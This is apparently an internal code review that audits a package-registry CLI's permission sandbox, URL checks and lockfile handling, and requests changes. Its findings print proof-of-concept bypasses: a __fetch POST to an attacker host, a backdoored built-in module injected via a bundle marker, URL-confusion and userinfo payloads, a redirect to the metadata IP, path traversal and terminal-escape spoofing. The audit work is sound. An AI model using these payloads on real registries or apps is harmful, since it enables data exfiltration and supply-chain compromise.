# Critic 046 — Independent Review of Registry CLI, Lockfile, Trust Marks, and Validator (PR #61)

- **From:** critic
- **To:** builder
- **Date:** 2026-11-23
- **Commit:** `fb353d7` (`registry-cli`)
- **Status:** open

**Verdict: REQUEST CHANGES.** Scope discipline is strong (`tj-core`, device builds, and `Cargo.toml` are untouched at 0 bytes added; `compliance::Pack::validate_standalone` reuses the single source of truth cleanly), but static audit found **8 blockers** — including 5 concrete permission/sandbox bypasses in `verify_package_source`, an HTTPS→HTTP redirect & `localhost:pass@evil.com` bypass in the registry fetcher, and fail-open `--min-trust` gaps in `tj check` and `tj serve` — plus 4 gaps and 2 watch items.

## Items

### REG-1 [blocker | builder] `__fetch()` built-in completely bypasses `verify_package_source` network & plain-HTTP checks
- **Where:** `crates/tj-cli/src/registry.rs:812-855, 914-919` (cross-ref `crates/tj-core/src/vm/builtins.rs:35`, `crates/tj-core/src/compile.rs:247, 949-967`)
- **Case for:** `tj-core` exposes `__fetch` as a global built-in (`GKind::Builtin`, `file: EVERYWHERE`). `compile.rs:247` only forbids *declaring* `__*` identifiers, not calling them, and `typeck.rs` treats unknown globals as `any`. `collect_expr_caps` only matches `"fetch"`, `"plugin"`, and `"invoke"`. Concrete exploit — a `kind: "library"` package with `permissions: { network: [], plugins: [], pii: [], device: [] }` compiles cleanly and passes `verify_package_source` with zero errors/warnings:
  ```ts
  export async function exfil(x: string): any {
    return await __fetch("http://attacker.example/steal", { method: "POST", body: x })
  }
  ```
  This bypasses `permissions.network`, dynamic URL enforcement, and the plain `http://` ban simultaneously.
- **Case against (cost):** ~4 lines in `collect_expr_caps` (rejecting any reference/call to `__fetch` unconditionally in registry packages); 0 bytes in `tj-core`.
- **Proposal:** Reject any `ExprKind::Ident("__fetch")` (direct call or bare reference) in `collect_expr_caps` with an error telling authors to use `fetch()`, and add a regression test.

### REG-2 [blocker | builder] Top-level destructuring defaults (`Item::Let`) are not walked by `collect_program_caps`
- **Where:** `crates/tj-cli/src/registry.rs:682-686` (compare `Stmt::Let` at `registry.rs:742-747`; `crates/tj-core/src/compile.rs:342-346, 846-854`)
- **Case for:** `collect_program_caps` walks `d.init` for `Item::Let(d)` but omits `collect_pattern_caps(&d.pattern, caps)`. In `tj-core`, top-level record destructuring defaults compile and execute at boot (`compile.rs:852`). Concrete exploit:
  ```ts
  const { f = fetch } = {}
  export async function steal(u: string): any { return await f(u) }
  ```
  (Or `const { _ = fetch("http://evil.example/boot") } = {}`, or `const { p = plugin } = {}` in a plugin.) It compiles cleanly and passes `verify_package_source` with empty permissions, completely bypassing `permissions.network`, `permissions.plugins`, plain `http://`, and aliasing checks.
- **Case against (cost):** Literally 1 line (`collect_pattern_caps(&d.pattern, caps);`) in `registry.rs`; 0 bytes in `tj-core`.
- **Proposal:** Call `collect_pattern_caps(&d.pattern, caps)` in the `Item::Let(d)` arm of `collect_program_caps` and add a regression test.

### REG-3 [blocker | builder] Transitive built-in plugin bypass via `tj:agent` (1-hop walk misses `tj:agent -> tj:ai` and drops `uses_invoke`)
- **Where:** `crates/tj-cli/src/registry.rs:599-610` (cross-ref `plugins/agent/plugin.tj:5, 37`)
- **Case for:** `verify_package_source` only audits direct `modules::BUILT_IN` imports (1 hop) and only copies `bcaps.plugins`, `bcaps.network_hosts`, and `bcaps.pii`. `plugins/agent/plugin.tj` does not call `plugin("ai", ...)` directly — it imports `tj:ai` and calls `invoke(...)`. Concrete exploit: a `kind: "library"` package with `permissions: { plugins: [], network: [], pii: [], device: [] }` writes:
  ```ts
  import { act } from "tj:agent"
  export async function run(p: string): any { return await act(p, [{ role: "user", text: "hi" }], [], 1) }
  ```
  `verify_package_source` returns `Ok(vec![])`, even though the package reaches `tj:ai` (consuming server `ANTHROPIC_API_KEY` / LLM budget) and `invoke()` without declaring `"ai"` in `permissions.plugins`.
- **Case against (cost):** ~15 lines for a visited-set BFS over `BUILT_IN` imports in `verify_package_source` propagating all `UsedCapabilities` fields; 0 bytes in `tj-core` and bounded by 5 built-ins.
- **Proposal:** Walk `BUILT_IN` imports transitively with a `visited` set and propagate `plugins`, `network_hosts`, `plain_http_urls`, `dynamic_fetch`, `dynamic_plugin`, and `pii` (and decide/test whether importing `tj:agent` also requires `"agent"` or `"ai"` in `permissions.plugins`). Add a test importing `tj:agent` without declaring `"ai"`.

### REG-4 [blocker | builder] Bundle marker injection (`//# file: ...`) lets a registry package hijack built-in modules (`tj:consent`, `tj:privacy`, `tj:ai`)
- **Where:** `crates/tj-cli/src/registry.rs:556-593`, `crates/tj-cli/src/app.rs:38` (cross-ref `crates/tj-core/src/modules.rs:33-36, 63`)
- **Case for:** `modules::files` splits a bundle on any line starting with `//# file: `, and `modules::with_built_ins` skips injecting a built-in module whenever `present` already contains its name (`!present.iter().any(|p| p == name)`). Concrete exploit: a `kind: "library"` package `tj:helper` with empty permissions embeds:
  ```ts
  export function id(x: number): number { return x }
  //# file: tj:consent
  export @server @read("owner") object Consent {
    @allow("owner") give(p: string, t: string, v: string) {}
    @allow("owner") withdraw(p: string) {}
  }
  export function consented(person: string, purpose: string): boolean { return true }
  ```
  `tj_core::syntax::parse` treats `//# file: tj:consent` as a comment, `tj_core::compile` splits and compiles both files cleanly, and `verify_package_source` passes with zero permissions. When bundled into an app alongside `tj:consent`, `with_built_ins` skips the real built-in and runs the attacker's backdoored `consented()` (or fake `tj:privacy` / `tj:ai`). Prepending `//# file: tj:fake` also lets a `library` compile as a `tj:*` plugin file.
- **Case against (cost):** 3 lines in `verify_package_source` rejecting any line starting with `modules::MARKER` (`//# file: `); 0 bytes in `tj-core`, zero legitimate impact on packages.
- **Proposal:** Reject any package source containing a line starting with `modules::MARKER` (`//# file:`) in `verify_package_source` (and consider guarding against it in `app::read` for locked modules too). Add a regression test.

### REG-5 [blocker | builder] Registry client `is_loopback_http` accepts `http://localhost:pass@evil.com` and `fetch_bytes_https` checks HTTPS→HTTP downgrade only *after* following redirects
- **Where:** `crates/tj-cli/src/registry.rs:399-409, 1114-1124, 1192`
- **Case for:**
  1. `is_loopback_http` (`registry.rs:403`) returns `true` whenever `after.starts_with(':')` without rejecting `@` or validating numeric ports. Thus **`http://localhost:pass@evil.com/pwn.tj`** passes `is_loopback_http`! `ureq` treats `localhost:pass` as HTTP Basic Auth and fetches plaintext HTTP from `evil.com` (reachable both via `--registry` and via a local-registry manifest's `"url"` at line 1192).
  2. `fetch_bytes_https` (`registry.rs:1119-1124`) uses `ureq`'s default auto-redirect (up to 5 hops) and only checks `resp.get_url()` *after* `.call()` completes. Two failures: (a) `https://evil.example/a` → `302 http://169.254.169.254/latest/meta-data` (or `http://127.0.0.1:4700/...`) already executes the plaintext/SSRF request on the wire before `final_url` is checked; (b) a 2-hop `https://a` → `302 http://mitm` → `302 https://b` completely bypasses `initial_https && !final_url.starts_with("https://")` because `resp.get_url()` only reports the final URL.
- **Case against (cost):** Tightening `is_loopback_http` (parse authority up to `/`, `?`, `#`, reject `@`, require empty or numeric `:port`) and implementing a small bounded manual redirect loop with `.redirects(0)` validating each hop's scheme/host before issuing the next request is ~25 lines in `registry.rs` and 0 bytes in `tj-core`. (Note: blocking RFC1918 IPs unconditionally could break enterprise private registries on internal LANs, so keep blocking loopback/link-local `169.254.0.0/16` unless `allow_loopback` is set, and enforce HTTPS on every redirect hop.)
- **Proposal:** Fix `is_loopback_http` to parse authority strictly (forbidding `@` and non-numeric ports), set `.redirects(0)` in `fetch_bytes_https` with an explicit ≤5-hop loop that validates every `Location` before following (refusing any HTTPS→HTTP hop and link-local metadata IPs), and add unit tests for `http://localhost:pass@evil.com` and an `https -> http` redirect.

### REG-6 [blocker | builder] `extract_https_host` URL parser differential (`\@`), IPv6 bracket bug (`netloc_allowed`), and case-sensitive `HTTP://` bypass
- **Where:** `crates/tj-cli/src/registry.rs:635-640, 792-838` (cross-ref `crates/tj-cli/src/engine.rs:1003-1017`, `crates/tj-core/src/flow.rs:189`)
- **Case for:**
  1. **WHATWG `\` / `@` differential:** `extract_https_host` splits only on `['/', '?', '#']` and takes `authority.rsplit_once('@')`. For `fetch("https://evil.com\\@allowed.com/steal")`, `extract_https_host` returns `"allowed.com"` (PASS when `"allowed.com"` is declared), whereas the Web host's WHATWG `window.fetch` normalizes `\` to `/` in `https:` URLs and sends the request to **`evil.com`**! (`flow.rs:189` already rejects `authority.contains('@')` for this exact reason.)
  2. **IPv6 broken & over-permissive:** `extract_https_host` strips `[` `]` (returning `"2001:db8::1"`), then `registry.rs:636` passes `format!("{host}:443")` (`"2001:db8::1:443"`, unbracketed!) to `netloc_allowed`. `engine.rs:1007` splits on `:` and extracts `"2001"`. Valid IPv6 declarations always fail, while declaring `"2001"` in `permissions.network` matches *any* `2001::/16` IPv6 address!
  3. **Uppercase `HTTP://` bypass with `"*"`:** `u.starts_with("http://")` is case-sensitive (`registry.rs:816, 826`). With `permissions.network: ["*"]`, `fetch("HTTP://evil.com/leak")` skips `plain_http_urls`, sets `dynamic_fetch = true` (permitted by `"*"`), and sends plaintext HTTP on Web/Android/iOS where schemes are case-insensitive.
- **Case against (cost):** Rejecting `@`, `\`, and whitespace in `extract_https_host` (treating them as dynamic/invalid), formatting IPv6 as `[{host}]:443` when `host.contains(':')`, and lowercasing/trimming the scheme prefix before checking `http://` / `https://` is ~10 lines in `registry.rs`, 0 bytes in `tj-core`. (Bonus: for single-piece templates `` `https://api.example.com` ``, pass `parts.len() > 1` as `must_end_authority`.)
- **Proposal:** Reject `@`, `\`, and whitespace in `extract_https_host`, wrap IPv6 hosts in `[...]` before calling `netloc_allowed`, match `http://` / `https://` case-insensitively after trimming, and add regression tests for all three cases.

### REG-7 [blocker | builder] `imports_external_pkg` skips `tj_core::compile`, and registry packages can import app-local `./...` files
- **Where:** `crates/tj-cli/src/registry.rs:577-592`, `crates/tj-cli/src/app.rs:29-37` (cross-ref `crates/tj-core/src/modules.rs:119-132`)
- **Case for:**
  1. `verify_package_source` never rejects relative imports (`./...` or `../...`) inside a registry package. In `app.rs:31`, `modules::resolve("tj:evil", "./secret")` resolves to `"secret.tj"` inside the **host app's own directory**, allowing a third-party package to import exported objects/helpers directly from the host app.
  2. Any package that adds a single `import { x } from "tj:anything"` sets `imports_external_pkg = true`, causing `verify_package_source` to **skip `tj_core::compile` entirely** during `tj registry check` and `tj add`. A broken or malicious package can hide compile errors, type errors, `@pii` flow leaks, and `./app` relative imports behind a single external `tj:` import and pass `tj registry check` and `tj add` cleanly.
- **Case against (cost):** Rejecting non-`tj:` imports inside registry packages (both in `verify_package_source` and in `app.rs` when resolving a `tj:` module's imports) is ~8 lines and 0 bytes in `tj-core`. Checking whether external `tj:*` dependencies are supported at all right now: `tj add` does not resolve or install transitive `tj:*` dependencies, nor does it surface a dependency's permissions in `tj add`'s permission summary.
- **Proposal:** (1) Unconditionally reject any `imp.from` that does not start with `"tj:"` in `verify_package_source` and in `app.rs`'s `tj:` branch. (2) Either reject unresolved external `tj:*` imports in standalone `verify_package_source` until transitive dependency resolution exists, or at minimum emit an explicit warning that standalone compilation and transitive permission checks were skipped (and audit transitive locked packages in `app::read` / `check_lockfile`).

### REG-8 [blocker | builder] Enforcement & error-swallowing gaps in `tj check --against --json --min-trust`, `print_check_reports`, and `tj serve --min-trust`
- **Where:** `crates/tj-cli/src/main.rs:205, 401-445, 454-496, 531-567`, `crates/tj-cli/src/registry.rs:988-1009`
- **Case for:**
  1. **`tj check app.tj --against old.tj --json --min-trust verified` silently ignores `--min-trust` and `tj.lock`** (`main.rs:411-434`): returns exit code 0 even when `tj.lock` contains `Community`, `flagged`, or tampered packages!
  2. **Error overwriting hides supply-chain failures** (`main.rs:468, 489` and `437-440`): if `check_lockfile` fails (tampered hash or `--min-trust` violation) *and* `--compliance` fails, `failed = Some("some controls are not met (above)".into())` overwrites `failed`, so the lockfile/trust error is never printed at all! Similarly, at `main.rs:437-440`, a breaking-change error is overwritten if `print_check_reports` fails.
  3. **`tj serve app.tj --min-trust verified` silently accepts and ignores `--min-trust`** (`main.rs:205, 531`): `parse_args()` parses `--min-trust` for every command, so an operator running `tj serve app.tj --compliance pack.json --min-trust verified` gets zero error and zero enforcement (fail open!). Also, `load_locked_module` never warns on `pkg.flagged`, contradicting `docs/registry.md:65` ("`tj` warns when a used version is flagged later").
- **Case against (cost):** Accumulating errors in a `Vec<String>`, running `check_lockfile` on all `tj check` JSON/non-JSON paths, and enforcing `args.min_trust` (plus printing a stderr warning for `flagged` packages) in `serve` is ~20 lines in `main.rs`/`registry.rs` and 0 bytes in `tj-core`.
- **Proposal:** Call `registry::check_lockfile(app_dir, min_trust)` in the `--against --json` branch (and in `--manifest --json` whenever `tj.lock` exists or `min_trust.is_some()`), collect multiple check failures into a `Vec<String>` instead of overwriting `Option<String>`, enforce `args.min_trust` in `serve`, and emit a warning when `load_locked_module` loads a `flagged` package.

### REG-9 [gap | builder] `tj.lock` metadata is never validated on load (`load_locked_module`, `check_lockfile`, `retro_findings`)
- **Where:** `crates/tj-cli/src/registry.rs:623-630, 967-1058, 1062-1110`
- **Case for:** `load_locked_module`, `check_lockfile`, and `retro_findings` reconstruct a `PackageManifest` via `manifest_from_locked` and call `verify_package_source`, but never validate the lockfile's own metadata (`kind`, `version`, `source`, `entry`, `commit`, `license`, `publisher`, `permissions.network`, `permissions.plugins`). A tampered or PR-committed `tj.lock` with `"commit": "main"`, `"source": "http://evil.com"`, `"kind": "bogus"`, `"license": "PROPRIETARY"`, or invalid `permissions.network` entries (which line 628 silently discards via `.filter_map(|h| parse_fetch_allow(h).ok())`) passes `tj check` and `tj serve` cleanly.
- **Case against (cost):** ~12 lines calling a shared metadata validator (skipping only `port` since `LockedPackage` does not store `PortInfo`, and allowing `"local"` commit only for clean relative local `source` paths); 0 bytes in `tj-core`.
- **Proposal:** Validate locked package metadata in `load_locked_module`, `check_lockfile`, and `retro_findings`, and fail closed on invalid entries in `permissions.network` instead of silently filtering them out at line 628.

### REG-10 [gap | builder] Unvalidated semver prerelease, `entry`/GitHub URL chars, `permissions.pii`/`device`, and terminal-escape spoofing
- **Where:** `crates/tj-cli/src/registry.rs:372-397, 469-481, 1136-1145, 1250-1268`
- **Case for:**
  1. `valid_semver` (`registry.rs:372-376`) ignores everything after `-`, accepting `"1.0.0-\r\x1b[2Kadded tj:x 1.0.0  [Official]\n"` and allowing terminal output spoofing in `tj add` / `tj check`. Likewise `flagged`, `permissions.device`, `permissions.pii`, and `port.of`/`tests` allow control/ANSI characters.
  2. `permissions.pii` is never checked against `tj_core::vm::program::PII_CATEGORIES`.
  3. `valid_entry_path` (`registry.rs:382-397`) and `github_raw_url` (`registry.rs:1136-1145`) do not reject `%`, `?`, `#`, or whitespace in `entry` or GitHub `owner`/`repo`: an entry like `"%2e%2e/main/backdoor.tj"` passes `Component::Normal` and escapes the pinned `commit` path on `raw.githubusercontent.com` (reviewer inspects clean `commit`, `tj add` fetches unpinned `main` matching the manifest's `sha256`).
- **Case against (cost):** ~20 lines of character/allowlist validation in `registry.rs`; 0 bytes in `tj-core`.
- **Proposal:** Restrict semver prerelease/build identifiers to `[A-Za-z0-9.-+]` (rejecting empty segments), validate `permissions.pii` against `PII_CATEGORIES`, restrict `entry` / GitHub `owner` & `repo` to `[A-Za-z0-9._/-]` (no `%`, `?`, `#`, spaces), and reject `c.is_control()` on all printable manifest fields (`flagged`, `permissions.device`, `port`).

### REG-11 [gap | builder] Typosquat check ignores built-in `tj:*` modules and skips inference when run from inside `index/`
- **Where:** `crates/tj-cli/src/registry.rs:488-507, 1332-1337`
- **Case for:**
  1. `valid_package_name` rejects exact matches to `modules::BUILT_IN` (`ai`, `agent`, `privacy`, `consent`, `ui`), so `index/` will never contain manifests for them. Because `check_typosquats` only reads `index/*.json`, typosquats of security-critical built-ins (`tj:agents`, `tj:consents`, `tj:privcy`) pass `tj registry check` unflagged.
  2. Running `tj registry check money.json` from inside `index/` yields `manifest_path.parent() == Some("")`, whose `.file_name()` is `None`, so `inferred_index` silently becomes `None` and skips typosquat checks unless `--index .` is passed.
- **Case against (cost):** Checking `modules::BUILT_IN` names (with len >= 3 using standard Levenshtein threshold so 2-letter `ai`/`ui` don't over-block unrelated 2-letter names like `ci`/`db`) is ~8 lines; canonicalizing `manifest_path` before checking `parent().file_name()` is 2 lines.
- **Proposal:** Check typosquat distance against built-in module names (len >= 3) unconditionally in `validate_manifest`, and canonicalize `manifest_path` when inferring `index/`.

### REG-12 [gap | builder] `add_package` mutates disk before validating `tj.lock`, uses fixed `.tmp` names, and `tj retro` aborts before reporting tampered imported packages
- **Where:** `crates/tj-cli/src/registry.rs:956, 1222-1246`, `crates/tj-cli/src/retro.rs:137, 220-221`
- **Case for:**
  1. `add_package` writes `.tj-packages/<name>/plugin.tj` (`registry.rs:1224-1227`) before calling `read_lockfile(app_dir)?` (`registry.rs:1229`). If `tj.lock` is corrupt JSON or an unsupported version, `add_package` errors out after already clobbering `.tj-packages/<name>/`.
  2. `write_lockfile` (`tj.lock.tmp`) and `add_package` (`plugin.tmp`) use fixed temp filenames without a PID/random suffix, so concurrent `tj add` invocations race on the same temp file.
  3. In `retro.rs:137`, `app::read(file)?` runs before `registry::retro_findings` (`retro.rs:221`). If an imported locked package is missing or tampered, `tj retro --json` exits with a raw error string instead of returning a structured `[fix]` (`supply-chain`) finding as described in `docs/registry.md:183`.
- **Case against (cost):** Reading `tj.lock` before writing `.tj-packages/` and using `.tmp.<pid>` is ~6 lines. For `tj retro`, catching `app::read` failure when `tj.lock` has findings (or clarifying in `docs/registry.md` that `tj retro` fails fast on unreadable/tampered bundles just like compile errors) is small and straightforward.
- **Proposal:** Read `tj.lock` before writing `.tj-packages/` in `add_package`, add PID (and clean up on failure) to `.tmp` paths, and decide whether `tj retro` should emit structured `supply-chain` findings on tampered imported packages or clarify the doc.

### REG-13 [watch | builder] Third-party registry `plugin` packages are not recorded as PII transfer destinations in `tj_core::flow`
- **Where:** `crates/tj-core/src/flow.rs:294-302, 952-965` (interaction with `crates/tj-cli/src/app.rs:38`)
- **Case for:** `flow.rs:294` only registers modules in `modules::BUILT_IN` as `plugin_fns`. When an app uses a third-party registry plugin (e.g. `tj:stripe` calling `plugin("stripe", ...)`), `flow.rs` still blocks *unrevealed* PII via `self.sink` (line 959), but sets `to = None` for `"plugin"` (line 955). Consequently, *revealed* PII sent to a third-party registry plugin is omitted from `facts.transfers` and silently passes `tj check --compliance` (`transfers` control).
- **Case against (cost):** Keeping `tj-core` untouched in this PR kept the diff focused and guaranteed 0 device bytes. Note that `flow.rs` is gated under `#[cfg(feature = "check")]`, so fixing it later (mapping `plugin("<name>", ...)` to `Destination::Plugin(format!("tj:{name}"))`) still adds **0 bytes** to WASM, Android, and iOS builds.
- **Proposal:** Park for a small follow-up before third-party plugins are published to `mindmakr/tj-plugins` (or fix alongside these changes since `#[cfg(feature = "check")]` has zero device-size cost).

### REG-14 [watch | maintainer] `target/release/tj` binary size (+211 KB actual, budget 8350 → 8450 KB)
- **Where:** `scripts/budget.json:8`
- **Case for / against:** Device builds stayed at **0 bytes** added (`tj-core`, WASM, Android untouched, 0 new Cargo dependencies), aligning with `docs/vision.md` ("old devices are in scope"). The +211 KB Windows release CLI growth (`8171 → 8382 KB`, 68 KB headroom) is documented in the commit message and `feedback/2026-11-22-builder-045-registry-cli.md`. Acceptable; keep an eye on headroom after the fixes above.

## What passed cleanly
- **Scope & device budgets:** Zero edits to `crates/tj-core/`, `hosts/`, or `Cargo.toml`; external `mindmakr/tj-plugins` repo properly excluded per owner decision A4.
- **Compliance packs:** `compliance::Pack::validate_standalone` cleanly shares `merge_json` with `Pack::load` and properly refuses `extends` in standalone registry packs.
- **Local registry symlink escape:** `std::fs::canonicalize` + `starts_with(&canon_root)` at `registry.rs:1194-1199` properly prevents symlinks from escaping the local registry root.
- **Zero-config additive guarantee:** Apps without `tj.lock` incur only a single `ENOENT` stat and zero extra ceremony.

## Not checked
- Did not run `cargo test`, `cargo clippy`, or `bash scripts/budget.sh` (per `feedback/README.md` rule against competing builds in shared `target/`); all findings are from direct code inspection of commit `fb353d7`.
- Did not test live network behaviour against a real GitHub/HTTPS endpoint.

---
**Verdict: REQUEST CHANGES**
